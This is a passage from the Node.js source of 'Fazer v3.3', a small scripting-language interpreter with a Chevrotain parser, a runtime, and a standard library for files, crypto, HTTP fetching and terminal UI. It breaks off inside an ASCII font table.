#!/usr/bin/env node
"use strict";

/*
  Fazer v3.3 — interpreter "batteries included"
  - Chevrotain lexer/parser → AST
  - Runtime with scopes, functions, pipes, lists/maps, property/index access
  - Stdlib: fs/path/crypto/encoding/ui
*/

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const os = require("os");
const child_process = require("child_process");
const http = require("http");
const https = require("https");

// --- Helper: Fetch with Redirects ---
const fetchWithRedirects = (url, opts = {}, maxRedirects = 5) => {
    return new Promise((resolve, reject) => {
        if (maxRedirects === 0) return resolve({ status: 310, body: "Too many redirects", headers: {} });
        
        const isHttp = url.startsWith("http:");
        const mod = isHttp ? http : https;
        const options = { method: opts.method || "GET", headers: opts.headers || {} };
        
        const req = mod.request(url, options, (res) => {
            // Handle Redirects
            if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
                try {
                    const redirectUrl = new URL(res.headers.location, url).href;
                    fetchWithRedirects(redirectUrl, opts, maxRedirects - 1).then(resolve);
                    return;
                } catch(e) {}
            }
            
            let data = "";
            res.on("data", (chunk) => data += chunk);
            res.on("end", () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
        });
        
        req.on("error", (e) => resolve({ status: 0, body: "", error: e.message }));
        if (opts.body) req.write(String(opts.body));
        req.end();
    });
};

// --- GLOBAL ERROR HANDLERS ---
process.on('uncaughtException', (err) => {
  console.error("\n\n[FATAL ERROR] Uncaught Exception:", err);
  console.error("Press Ctrl+C to exit...");
  setInterval(() => {}, 1000); // Keep process alive
});

process.on('unhandledRejection', (reason, promise) => {
  console.error("\n\n[FATAL ERROR] Unhandled Rejection:", reason);
});
// -----------------------------

const { Lexer, createToken, EmbeddedActionsParser } = require("chevrotain");

/* ────────────────────────────────────────────────────────────────────────── */
/* Tokens                                                                     */
/* ────────────────────────────────────────────────────────────────────────── */

const WhiteSpace = createToken({ name: "WhiteSpace", pattern: /[ \t\r\n]+/, group: Lexer.SKIPPED });
const Comment = createToken({ name: "Comment", pattern: /(#|\/\/)[^\n]*/, group: Lexer.SKIPPED });

const Assign = createToken({ name: "Assign", pattern: /:=/ });
const SingleEq = createToken({ name: "SingleEq", pattern: /=/ });

const Arrow = createToken({ name: "Arrow", pattern: /->|→/ });
const DoublePipe = createToken({ name: "DoublePipe", pattern: /->>|\|>|→>/ });

const Case = createToken({ name: "Case", pattern: /case\b/ });
const If = createToken({ name: "If", pattern: /if\b/ });
const Else = createToken({ name: "Else", pattern: /else\b/ });
const End = createToken({ name: "End", pattern: /end\b/ });

const Fn = createToken({ name: "Fn", pattern: /fn\b/ });
const Return = createToken({ name: "Return", pattern: /return\b/ });
const While = createToken({ name: "While", pattern: /while\b/ });
const Try = createToken({ name: "Try", pattern: /try\b/ });
const Catch = createToken({ name: "Catch", pattern: /catch\b/ });
const Mut = createToken({ name: "Mut", pattern: /mut\b/ });

const True = createToken({ name: "True", pattern: /true\b/ });
const False = createToken({ name: "False", pattern: /false\b/ });
const Null = createToken({ name: "Null", pattern: /null\b/ });

const And = createToken({ name: "And", pattern: /and\b/ });
const Or = createToken({ name: "Or", pattern: /or\b/ });
const Not = createToken({ name: "Not", pattern: /not\b/ });

const GreaterEq = createToken({ name: "GreaterEq", pattern: />=/ });
const LessEq = createToken({ name: "LessEq", pattern: /<=/ });
const Eq = createToken({ name: "Eq", pattern: /==/ });
const NotEq = createToken({ name: "NotEq", pattern: /!=/ });
const Greater = createToken({ name: "Greater", pattern: />/ });
const Less = createToken({ name: "Less", pattern: /</ });
const Exclamation = createToken({ name: "Exclamation", pattern: /!/ });

const LParen = createToken({ name: "LParen", pattern: /\(/ });
const RParen = createToken({ name: "RParen", pattern: /\)/ });
const LBracket = createToken({ name: "LBracket", pattern: /\[/ });
const RBracket = createToken({ name: "RBracket", pattern: /\]/ });
const LBrace = createToken({ name: "LBrace", pattern: /{/ });
const RBrace = createToken({ name: "RBrace", pattern: /}/ });

const Colon = createToken({ name: "Colon", pattern: /:/ });
const Comma = createToken({ name: "Comma", pattern: /,/ });
const Dot = createToken({ name: "Dot", pattern: /\./ });

const Plus = createToken({ name: "Plus", pattern: /\+/ });
const Minus = createToken({ name: "Minus", pattern: /-/ });
const Star = createToken({ name: "Star", pattern: /\*/ });
const Slash = createToken({ name: "Slash", pattern: /\// });
const Percent = createToken({ name: "Percent", pattern: /%/ });

const Float = createToken({ name: "Float", pattern: /-?\d+\.\d+/ });
const Integer = createToken({ name: "Integer", pattern: /-?\d+/ });
const StringLiteral = createToken({
  name: "StringLiteral",
  pattern: /"([^"\\]|\\.)*"/,
});

const Identifier = createToken({
  name: "Identifier",
  pattern: /[a-zA-Z_][a-zA-Z0-9_]*/,
});

const allTokens = [
  WhiteSpace,
  Comment,

  Assign,

  DoublePipe,
  Arrow,

  Case,
  If,
  Else,
  End,

  Fn,
  Return,
  While,
  Try,
  Catch,
  Mut,

  True,
  False,
  Null,

  And,
  Or,
  Not,

  GreaterEq,
  LessEq,
  Eq,
  NotEq,
  Greater,
  Less,
  Exclamation,
  SingleEq,

  LParen,
  RParen,
  LBracket,
  RBracket,
  LBrace,
  RBrace,

  Colon,
  Comma,
  Dot,

  Plus,
  Minus,
  Star,
  Slash,
  Percent,

  Float,
  Integer,
  StringLiteral,
  Identifier,
];

const lexer = new Lexer(allTokens, { positionTracking: "full" });

/* ────────────────────────────────────────────────────────────────────────── */
/* Parser → AST                                                               */
/* ────────────────────────────────────────────────────────────────────────── */

class FazerParser extends EmbeddedActionsParser {
  constructor() {
    super(allTokens, { recoveryEnabled: true });
    const $ = this;

    const node = (type, props) => ({ type, ...props });

    $.RULE("program", () => {
      const stmts = [];
      $.MANY(() => {
        const s = $.SUBRULE($.statement);
        if (s) stmts.push(s);
      });
      return stmts;
    });

    $.RULE("statement", () =>
      $.OR([
        { ALT: () => $.SUBRULE($.fnDef) },
        { ALT: () => $.SUBRULE($.returnStmt) },
        { ALT: () => $.SUBRULE($.ifStmt) },
        { ALT: () => $.SUBRULE($.whileStmt) },
        { ALT: () => $.SUBRULE($.tryStmt) },
        {
          GATE: () => {
            const t1 = $.LA(1).tokenType;
            if (t1 === Mut) return true;
            const t2 = $.LA(2).tokenType;
            return t1 === Identifier && (t2 === Assign || t2 === SingleEq);
          },
          ALT: () => $.SUBRULE($.assignStmt)
        },
        { ALT: () => $.SUBRULE($.caseBlock) },
        { ALT: () => $.SUBRULE($.exprStmt) },
      ])
    );

    $.RULE("fnDef", () => {
      $.CONSUME(Fn);
      const nameTok = $.CONSUME(Identifier);
      $.CONSUME(LParen);
      const params = [];
      $.OPTION(() => {
        params.push($.CONSUME2(Identifier).image);
        $.MANY(() => {
          $.CONSUME(Comma);
          params.push($.CONSUME3(Identifier).image);
        });
      });
      $.CONSUME(RParen);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("fn", { name: nameTok.image, params, body, loc: locOf(nameTok) });
    });

    $.RULE("returnStmt", () => {
      const tok = $.CONSUME(Return);
      const value = $.OPTION(() => $.SUBRULE($.expression));
      return node("return", { value: value ?? node("null", {}), loc: locOf(tok) });
    });

    $.RULE("ifStmt", () => {
      const tok = $.CONSUME(If);
      const expr = $.SUBRULE($.expression);
      $.CONSUME(Arrow);
      const thenBlock = $.SUBRULE($.body);
      let elseBlock = null;
      $.OR([
        { ALT: () => $.CONSUME(End) },
        {
          ALT: () => {
            $.CONSUME(Else);
            $.OR2([
              {
                ALT: () => {
                  const nested = $.SUBRULE($.ifStmt);
                  elseBlock = [nested];
                }
              },
              {
                ALT: () => {
                  $.CONSUME2(Arrow);
                  elseBlock = $.SUBRULE2($.body);
                  $.CONSUME2(End);
                }
              }
            ]);
          }
        }
      ]);
      return node("if", { expr, thenBlock, elseBlock, loc: locOf(tok) });
    });

    $.RULE("whileStmt", () => {
      const tok = $.CONSUME(While);
      const expr = $.SUBRULE($.expression);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("while", { expr, body, loc: locOf(tok) });
    });

    $.RULE("tryStmt", () => {
      const tok = $.CONSUME(Try);
      $.CONSUME(Arrow);
      const tryBlock = $.SUBRULE($.block);
      $.CONSUME(Catch);
      const errVar = $.CONSUME(Identifier).image;
      $.CONSUME2(Arrow);
      const catchBlock = $.SUBRULE2($.block);
      return node("try", { tryBlock, catchBlock, errVar, loc: locOf(tok) });
    });

    $.RULE("assignStmt", () => {
      const mutTok = $.OPTION(() => $.CONSUME(Mut));
      const idTok = $.CONSUME(Identifier);
      
      const op = $.OR([
        { ALT: () => $.CONSUME(Assign) },
        { ALT: () => $.CONSUME(SingleEq) }
      ]);

      // Relaxed Assignment: Allow '=' for re-assignment (but not declaration if we were strict, but let's be flexible)
      // Actually, Fazer design uses := for declaration/assignment.
      // But user wants '=' to work. So we just accept it.

      const value = $.SUBRULE($.expression);
      return node("assign", {
        name: idTok.image,
        mut: !!mutTok,
        value,
        loc: locOf(idTok),
      });
    });

    $.RULE("caseBlock", () => {
      const caseTok = $.CONSUME(Case);
      // Use addExpr to avoid consuming comparison operators (==, >, etc.) which start patterns
      const expr = $.SUBRULE($.addExpr);
      const arms = [];
      $.AT_LEAST_ONE(() => {
        const pat = $.OR([
          { ALT: () => $.SUBRULE($.pattern) },
          { ALT: () => ( $.CONSUME(Else), node("else", {}) ) },
        ]);
        $.CONSUME(Arrow);
        const body = $.SUBRULE($.block);
        arms.push({ pat, body });
      });
      $.CONSUME(End);
      return node("case", { expr, arms, loc: locOf(caseTok) });
    });

    $.RULE("body", () => {
      const stmts = [];
      $.MANY(() => {
        const s = $.SUBRULE($.statement);
        if (s) stmts.push(s);
      });
      return stmts;
    });

    $.RULE("block", () => {
      const stmts = $.SUBRULE($.body);
      $.CONSUME(End);
      return stmts;
    });

    $.RULE("exprStmt", () => {
      const expr = $.SUBRULE($.expression);
      if (!expr) return node("noop", {});
      return node("exprstmt", { expr, loc: expr.loc ?? null });
    });

    $.RULE("pattern", () =>
      $.OR([
        { ALT: () => $.SUBRULE($.patternCompare) },
        { ALT: () => $.SUBRULE($.literal) },
        { ALT: () => node("identPat", { name: $.CONSUME(Identifier).image }) }, // binds
      ])
    );

    $.RULE("patternCompare", () => {
      // Examples:
      //   > 10
      //   <= 3
      const opTok = $.OR([
        { ALT: () => $.CONSUME(GreaterEq) },
        { ALT: () => $.CONSUME(LessEq) },
        { ALT: () => $.CONSUME(Greater) },
        { ALT: () => $.CONSUME(Less) },
        { ALT: () => $.CONSUME(Eq) },
        { ALT: () => $.CONSUME(NotEq) },
        { ALT: () => $.CONSUME(SingleEq) },
      ]);

      if (opTok.tokenType && opTok.tokenType.name === "SingleEq") {
        throw new FazerError("Invalid operator '=' in pattern. Use '==' or just the value.", { line: opTok.startLine, col: opTok.startColumn });
      }

      const rhs = $.SUBRULE($.expression);
      return node("cmpPat", { op: opTok.image, rhs });
    });

    /* Expression precedence:
      pipe →>   (lowest)
      or
      and
      equality
      relational
      additive
      multiplicative
      unary
      postfix (calls, dot, index)
      primary
    */

    $.RULE("expression", () => $.SUBRULE($.pipeExpr));

    $.RULE("pipeExpr", () => {
      let left = $.SUBRULE($.orExpr);
      $.MANY(() => {
        $.CONSUME(DoublePipe);
        const right = $.SUBRULE2($.orExpr);
        left = node("pipe", { left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("orExpr", () => {
      let left = $.SUBRULE($.andExpr);
      $.MANY(() => {
        $.CONSUME(Or);
        const right = $.SUBRULE2($.andExpr);
        left = node("bin", { op: "or", left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("andExpr", () => {
      let left = $.SUBRULE($.eqExpr);
      $.MANY(() => {
        $.CONSUME(And);
        const right = $.SUBRULE2($.eqExpr);
        left = node("bin", { op: "and", left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("eqExpr", () => {
      let left = $.SUBRULE($.relExpr);
      $.MANY(() => {
        const opTok = $.OR([
          { ALT: () => $.CONSUME(Eq) },
          { ALT: () => $.CONSUME(NotEq) },
          { ALT: () => $.CONSUME(SingleEq) },
        ]);

        if (opTok.tokenType && opTok.tokenType.name === "SingleEq") {
          throw new FazerError("Invalid operator '='. Use '==' for equality.", { line: opTok.startLine, col: opTok.startColumn });
        }

        const right = $.SUBRULE2($.relExpr);
        left = node("bin", { op: opTok.image, left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("relExpr", () => {
      let left = $.SUBRULE($.addExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(GreaterEq).image },
          { ALT: () => $.CONSUME(LessEq).image },
          { ALT: () => $.CONSUME(Greater).image },
          { ALT: () => $.CONSUME(Less).image },
        ]);
        const right = $.SUBRULE2($.addExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("addExpr", () => {
      let left = $.SUBRULE($.mulExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(Plus).image },
          { ALT: () => $.CONSUME(Minus).image },
        ]);
        const right = $.SUBRULE2($.mulExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("mulExpr", () => {
      let left = $.SUBRULE($.unaryExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(Star).image },
          { ALT: () => $.CONSUME(Slash).image },
          { ALT: () => $.CONSUME(Percent).image },
        ]);
        const right = $.SUBRULE2($.unaryExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });

    $.RULE("unaryExpr", () =>
      $.OR([
        {
          ALT: () => {
            const tok = $.OR2([
              { ALT: () => $.CONSUME(Not) },
              { ALT: () => $.CONSUME(Exclamation) }
            ]);
            const expr = $.SUBRULE($.unaryExpr);
            return node("un", { op: "not", expr, loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Minus);
            const expr = $.SUBRULE2($.unaryExpr);
            return node("un", { op: "-", expr, loc: locOf(tok) });
          },
        },
        { ALT: () => $.SUBRULE($.postfixExpr) },
      ])
    );

    $.RULE("postfixExpr", () => {
      let base = $.SUBRULE($.primaryExpr);

      $.MANY(() => {
        $.OR([
          {
            ALT: () => {
              // call: foo(a,b)
              $.CONSUME(LParen);
              const args = [];
              $.OPTION(() => {
                args.push($.SUBRULE($.expression));
                $.MANY2(() => {
                  $.CONSUME(Comma);
                  args.push($.SUBRULE2($.expression));
                });
              });
              $.CONSUME(RParen);
              base = node("call", { callee: base, args, loc: base.loc ?? null });
            },
          },
          {
            ALT: () => {
              // dot: obj.key
              $.CONSUME(Dot);
              const keyTok = $.CONSUME(Identifier);
              base = node("get", { obj: base, key: node("str", { value: keyTok.image }), loc: base.loc ?? null });
            },
          },
          {
            ALT: () => {
              // index: obj[expr]
              $.CONSUME(LBracket);
              const idx = $.SUBRULE3($.expression);
              $.CONSUME(RBracket);
              base = node("idx", { obj: base, idx, loc: base.loc ?? null });
            },
          },
        ]);
      });

      return base;
    });

    $.RULE("primaryExpr", () =>
      $.OR([
        { ALT: () => $.SUBRULE($.literal) },
        {
          ALT: () => {
            const tok = $.CONSUME(Identifier);
            return node("ident", { name: tok.image, loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            $.CONSUME(LParen);
            const e = $.SUBRULE($.expression);
            $.CONSUME(RParen);
            return e;
          },
        },
        { ALT: () => $.SUBRULE($.listLiteral) },
        { ALT: () => $.SUBRULE($.mapLiteral) },
        { ALT: () => $.SUBRULE($.fnExpr) },
      ])
    );

    $.RULE("fnExpr", () => {
      const tok = $.CONSUME(Fn);
      $.CONSUME(LParen);
      const params = [];
      $.OPTION(() => {
        params.push($.CONSUME(Identifier).image);
        $.MANY(() => {
          $.CONSUME(Comma);
          params.push($.CONSUME2(Identifier).image);
        });
      });
      $.CONSUME(RParen);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("fn", { name: null, params, body, loc: locOf(tok) });
    });

    $.RULE("literal", () =>
      $.OR([
        {
          ALT: () => {
            const tok = $.CONSUME(Float);
            return node("num", { value: Number(tok.image), loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Integer);
            return node("num", { value: Number(tok.image), loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(StringLiteral);
            return node("str", { value: unescapeString(tok.image), loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(True);
            return node("bool", { value: true, loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(False);
            return node("bool", { value: false, loc: locOf(tok) });
          },
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Null);
            return node("null", { loc: locOf(tok) });
          },
        },
      ])
    );

    $.RULE("listLiteral", () => {
      const tok = $.CONSUME(LBracket);
      const items = [];
      $.OPTION(() => {
        items.push($.SUBRULE($.expression));
        $.MANY(() => {
          $.CONSUME(Comma);
          items.push($.SUBRULE2($.expression));
        });
      });
      $.CONSUME(RBracket);
      return node("list", { items, loc: locOf(tok) });
    });

    $.RULE("mapLiteral", () => {
      const tok = $.CONSUME(LBrace);
      const entries = [];
      $.OPTION(() => {
        entries.push($.SUBRULE($.mapEntry));
        $.MANY(() => {
          $.CONSUME(Comma);
          entries.push($.SUBRULE2($.mapEntry));
        });
      });
      $.CONSUME(RBrace);
      return node("map", { entries, loc: locOf(tok) });
    });

    $.RULE("mapEntry", () => {
      // key can be Identifier or String
      const key = $.OR([
        {
          ALT: () => {
            const t = $.CONSUME(StringLiteral);
            return node("str", { value: unescapeString(t.image), loc: locOf(t) });
          },
        },
        {
          ALT: () => {
            const t = $.CONSUME(Identifier);
            return node("str", { value: t.image, loc: locOf(t) });
          },
        },
      ]);
      $.CONSUME(Colon);
      const value = $.SUBRULE($.expression);
      return { key, value };
    });

    this.performSelfAnalysis();
  }
}

/* ────────────────────────────────────────────────────────────────────────── */
/* Runtime                                                                     */
/* ────────────────────────────────────────────────────────────────────────── */

class FazerError extends Error {
  constructor(message, meta = {}) {
    super(message);
    this.name = "FazerError";
    this.meta = meta;
  }
}

class ReturnSignal {
  constructor(value) {
    this.value = value;
  }
}

class Scope {
  constructor(parent = null) {
    this.parent = parent;
    this.vars = new Map(); // name -> {value, mut}
  }
  hasHere(name) { return this.vars.has(name); }
  get(name) {
    if (this.vars.has(name)) return this.vars.get(name);
    if (this.parent) return this.parent.get(name);
    return null;
  }
  set(name, value, mut = false) {
    this.vars.set(name, { value, mut });
  }
  assign(name, value) {
    if (this.vars.has(name)) {
      const cell = this.vars.get(name);
      if (!cell.mut) throw new FazerError(`Variable '${name}' is immutable (use mut)`);
      cell.value = value;
      return;
    }
    if (this.parent) return this.parent.assign(name, value);
    throw new FazerError(`Undefined variable '${name}'`);
  }
}

class FazerRuntime {
  constructor({ argv = process.argv.slice(2), filename = "<stdin>", code = "" } = {}) {
    this.filename = filename;
    this.code = code;
    this.global = new Scope(null);
    this.fns = new Map(); // name -> {params, body, closure}
    this.native_ui_state = { widgets: [], updates: {} };
    this._installStdlib(argv);
  }

  _installStdlib(argv) {
    const { execFileSync } = require("child_process");
    let WebSocket = null;
    try { WebSocket = require("ws"); } catch (e) {}

    const ANSI = {
      reset: "\x1b[0m",
      bold: "\x1b[1m",
      dim: "\x1b[2m",
      red: "\x1b[31m",
      green: "\x1b[32m",
      yellow: "\x1b[33m",
      blue: "\x1b[34m",
      magenta: "\x1b[35m",
      cyan: "\x1b[36m",
      gray: "\x1b[90m",
    };

    const style = (s, c) => (ANSI[c] || "") + String(s) + ANSI.reset;

    const stripAnsi = (s) => String(s).replace(/\x1b\[[0-9;]*m/g, "");

    const box = (title, lines) => {
      const arr = Array.isArray(lines) ? lines.map(String) : [String(lines)];
      const all = [String(title), ...arr];
      
      const visibleLen = (s) => stripAnsi(s).length;
      const w = Math.max(...all.map(visibleLen)) + 4;
      
      const top = "┌" + "─".repeat(w - 2) + "┐";
      const bot = "└" + "─".repeat(w - 2) + "┘";
      
      const mid = all.map((l) => {
        const vl = visibleLen(l);
        const pad = w - 4 - vl;
        return "│ " + l + " ".repeat(Math.max(0, pad)) + " │";
      });
      
      console.log(top);
      for (const m of mid) console.log(m);
      console.log(bot);
      return null;
    };

    const toBuf = (x, enc = "utf8") => {
      if (Buffer.isBuffer(x)) return x;
      if (typeof x === "string") return Buffer.from(x, enc);
      return Buffer.from(String(x), enc);
    };

    const readText = (p) => fs.readFileSync(path.resolve(String(p)), "utf8");
    const writeText = (p, s) => { fs.writeFileSync(path.resolve(String(p)), String(s), "utf8"); return null; };

    const readBytesB64 = (p) => fs.readFileSync(path.resolve(String(p))).toString("base64");
    const writeBytesB64 = (p, b64) => { fs.writeFileSync(path.resolve(String(p)), Buffer.from(String(b64), "base64")); return null; };

    const hex = (buf) => Buffer.from(buf).toString("hex");
    const b64 = (buf) => Buffer.from(buf).toString("base64");
    const fromHex = (h) => Buffer.from(String(h), "hex");
    const fromB64 = (b) => Buffer.from(String(b), "base64");

    const sha256 = (x) => hex(crypto.createHash("sha256").update(toBuf(x)).digest());

    // AES-256-GCM(payload): [salt16|iv12|tag16|ct...], base64-encoded
    const encText = (plaintext, password) => {
      const salt = crypto.randomBytes(16);
      const key = crypto.scryptSync(String(password), salt, 32);
      const iv = crypto.randomBytes(12);
      const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
      const ct = Buffer.concat([cipher.update(String(plaintext), "utf8"), cipher.final()]);
      const tag = cipher.getAuthTag();
      return b64(Buffer.concat([salt, iv, tag, ct]));
    };

    const decText = (payloadB64, password) => {
      const payload = fromB64(payloadB64);
      if (payload.length < 16 + 12 + 16) throw new FazerError("Invalid encrypted payload");
      const salt = payload.subarray(0, 16);
      const iv = payload.subarray(16, 28);
      const tag = payload.subarray(28, 44);
      const ct = payload.subarray(44);
      const key = crypto.scryptSync(String(password), salt, 32);
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
      decipher.setAuthTag(tag);
      const pt = Buffer.concat([decipher.update(ct), decipher.final()]);
      return pt.toString("utf8");
    };

    const encB64 = (b64data, password) => encText(String(b64data), password);
    const decB64 = (payloadB64, password) => decText(payloadB64, password);

    const pathJoin = (...xs) => path.join(...xs.map(String));
    const pathAbs = (p) => path.resolve(String(p));
    const pathDir = (p) => path.dirname(String(p));
    const pathBase = (p) => path.basename(String(p));

    const nowMs = () => Date.now();
    const len = (x) => (x == null ? 0 : (typeof x === "string" || Array.isArray(x)) ? x.length : (typeof x === "object" ? Object.keys(x).length : 0));

    const keys = (o) => {
      if (o == null || typeof o !== "object") return [];
      return Object.keys(o);
    };

    const get = (o, k) => {
      if (o == null) return null;
      if (Array.isArray(o)) return o[Number(k)];
      return o[String(k)];
    };

    const set = (o, k, v) => {
      if (o == null || typeof o !== "object") throw new FazerError("set(obj,key,val) expects object/list");
      if (Array.isArray(o)) { o[Number(k)] = v; return o; }
      o[String(k)] = v; return o;
    };

    const argvFn = () => argv.slice();
    const envFn = (k) => process.env[String(k)] ?? null;
    const cwdFn = () => process.cwd();

    const http = require("http");
    const https = require("https");
    const child_process = require("child_process");

    // Helper for gradients
    const makeGradient = (text, startColor, endColor) => {
        const len = text.length;
        if (len === 0) return "";
        const [r1, g1, b1] = startColor;
        const [r2, g2, b2] = endColor;
        let res = "";
        for (let i = 0; i < len; i++) {
            const ratio = i / (len - 1 || 1);
            const r = Math.round(r1 + (r2 - r1) * ratio);
            const g = Math.round(g1 + (g2 - g1) * ratio);
            const b = Math.round(b1 + (b2 - b1) * ratio);
            res += `\x1b[38;2;${r};${g};${b}m${text[i]}`;
        }
        return res + "\x1b[0m";
    };

    // Input Buffer for term_read
    let stdinBuffer = [];
    let stdinListener = null;

    const enableRawInput = (enable) => {
         try {
            if (process.stdin.isTTY) {
                process.stdin.setRawMode(!!enable);
            }
         } catch(e) {}

         if (enable) {
             process.stdin.resume();
             if (!stdinListener) {
                 stdinListener = (chunk) => {
                     const str = chunk.toString();
                     for (const char of str) stdinBuffer.push(char);
                 };
                 process.stdin.on('data', stdinListener);
             }
         } else {
               try {
                   if (process.stdin.isTTY) process.stdin.setRawMode(false);
               } catch(e) {}
               if (stdinListener) {
                   process.stdin.removeListener('data', stdinListener);
                   stdinListener = null;
               }
               process.stdin.pause();
          }
     };

    // --- ASCII FONTS ---
const ASCII_FONTS = {
    "standard": {
        "0": [
            " 000 ",
            "0  00",
            "0 0 0",
            "00  0",
            " 000 "
        ],
        "1": [
            "  1  ",
            " 11  ",
            "  1  ",
            "  1  ",
            " 111 "
        ],
        "2": [
            " 222 ",
            "2   2",
            "   2 ",
            "  2  ",
            "22222"
        ],
        "3": [
            "3333 ",
            "    3",
            "  33 ",
            "    3",
            "3333 "
        ],
        "4": [
            "4  4 ",
            "4  4 ",
            "44444",
            "   4 ",
            "   4 "
        ],
        "5": [
            "55555",
            "5    ",
            "5555 ",
            "    5",
            "5555 "
        ],
        "6": [
            " 666 ",
            "6    ",
            "6666 ",
            "6   6",
            " 666 "
        ],
        "7": [
            "77777",
            "   7 ",
            "  7  ",
            " 7   ",
            "7    "
        ],
        "8": [
            " 888 ",
            "8   8",
            " 888 ",
            "8   8",
            " 888 "
        ],
        "9": [
            " 999 ",
            "9   9",
            " 9999",
            "    9",
            " 999 "
        ],
        " ": [
            "     ",
            "     ",
            "     ",
            "     ",
            "     "
        ],
        "A": [
            "  A  ",
            " A A ",
            "AAAAA",
            "A   A",
            "A   A"
        ],
        "B": [
            "BBBB ",
            "B   B",
            "BBBB ",
            "B   B",
            "BBBB "
        ],
        "C": [
            " CCCC",
            "C    ",
            "C    ",
            "C    ",
            " CCCC"
        ],
        "D": [
            "DDDD ",
            "D   D",
            "D   D",
            "D   D",
            "DDDD "
        ],
        "E": [
            "EEEEE",
            "E    ",
            "EEE  ",
            "E    ",
            "EEEEE"
        ],
        "F": [
            "FFFFF",
            "F    ",
            "FFF  ",
            "F    ",
            "F    "
        ],
        "G": [
            " GGGG",
            "G    ",
            "G  GG",
            "G   G",
            " GGGG"
        ],
        "H": [
            "H   H",
            "H   H",
            "HHHHH",
            "H   H",
            "H   H"
        ],
        "I": [
            "IIIII",
            "  I  ",
            "  I  ",
            "  I  ",
            "IIIII"
        ],
        "J": [
            "JJJJJ",
            "  J  ",
            "  J  ",
            "J J  ",
            " JJ  "
        ],
        "K": [
            "K   K",
            "K  K ",
            "KKK  ",
            "K  K ",
            "K   K"
        ],
        "L": [
            "L    ",
            "L    ",
            "L    ",
            "L    ",
            "LLLLL"
        ],
        "M": [
            "M   M",
            "MM MM",
            "M M M",
            "M   M",
            "M   M"
        ],
        "N": [
            "N   N",
            "NN  N",
            "N N N",
            "N  NN",
            "N   N"
        ],
        "O": [
            " OOO ",
            "O   O",
            "O   O",
            "O   O",
            " OOO "
        ],
        "P": [
            "PPPP ",
            "P   P",
            "PPPP ",
            "P    ",
            "P    "
        ],
        "Q": [
            " QQQ ",
            "Q   Q",
            "Q   Q",
            "Q  QQ",
            " QQQQ"
        ],
        "R": [
            "RRRR ",
            "R   R",
            "RRRR ",
            "R  R ",
            "R   R"
        ],
        "S": [
            " SSSS",
            "S    ",
            " SSS ",
            "    S",
            "SSSS "
        ],
        "T": [
            "TTTTT",
            "  T  ",
            "  T  ",
            "  T  ",
            "  T  "
        ],
        "U": [
            "U   U",
            "U   U",
            "U   U",
            "U   U",
            " UUU "
        ],
        "V": [
            "V   V",
            "V   V",
            "V   V",
            " V V ",
            "  V  "
        ],
        "W": [
            "W   W",
            "W   W",
            "W W W",
            "W W W",
            " W W "
        ],
        "X": [
            "X   X",
            " X X ",
            "  X  ",
            " X X ",
            "X   X"
        ],
        "Y": [
            "Y   Y",
            " Y Y ",
            "  Y  ",
            "  Y  ",
            "  Y  "
        ],
        "Z": [
            "ZZZZZ",
            "   Z ",
            "  Z  ",
            " Z   ",
            "ZZZZZ"
        ]
    },
    "block": {
        "0": [
            "█▀█",
            "█ █",
            "▀▀▀"
        ],
        "1": [
            "▄█ ",
            " █ ",
            "▄█▄"
        ],
        "2": [
            "▀▀█",
            " █ ",
            "█▀▀"
        ],
        "3": [
            "▀▀█",
            " ▀█",
            "▀▀▀"
        ],
        "4": [
            "█ █",
            "█▀█",
            "  █"
        ],
        "5": [
            "█▀▀",
            "▀▀▄",
            "▀▀▀"
        ],
        "6": [
            "█▀ ",
            "█▀█",
            "▀▀▀"
        ],
        "7": [
            "▀▀█",
            "  █",
            "  ▀"
        ],
        "8": [
            "█▀█",
            "█▀█",
            "▀▀▀"
        ],
        "9": [
            "█▀█",
            "▀▀█",
            "  ▀"
        ],
        " ": [
            "   ",
            "   ",
            "   "
        ],
        "A": [
            "▄▀▄",
            "█▀█",
            "▀ ▀"
        ],
        "B": [
            "█▀▄",
            "█▀▄",
            "▀▀ "
        ],
        "C": [
            "▄▀▀",
            "█  ",
            "▀▀▀"
        ],
        "D": [
            "█▀▄",
            "█ █",
            "▀▀ "
        ],
        "E": [
            "█▀▀",
            "█▀▀",
            "▀▀▀"
        ],
        "F": [
            "█▀▀",
            "█▀▀",
            "▀  "
        ],
        "G": [
            "█▀▀",
            "█ █",
            "▀▀▀"
        ],
        "H": [
            "█ █",
            "█▀█",
            "▀ ▀"
        ],
        "I": [
            "▀█▀",
            " █ ",
            "▀█▀"
        ],
        "J": [
            " ▄▄",
            " █ ",
            "▀  "
        ],
        "K": [
            "█ ▄",
            "█▀▄",
            "▀ ▀"
        ],
        "L": [
            "█  ",
            "█  ",
            "▀▀▀"
        ],
        "M": [
            "█▀█",
            "█ █",
            "▀ ▀"
        ],
        "N": [
            "█▀▄",
            "█ █",
            "▀ ▀"
        ],
        "O": [
            "▄▀▄",
            "█ █",
            "▀▀▀"
        ],
        "P": [
            "█▀▄",
            "█▀▀",
            "▀  "
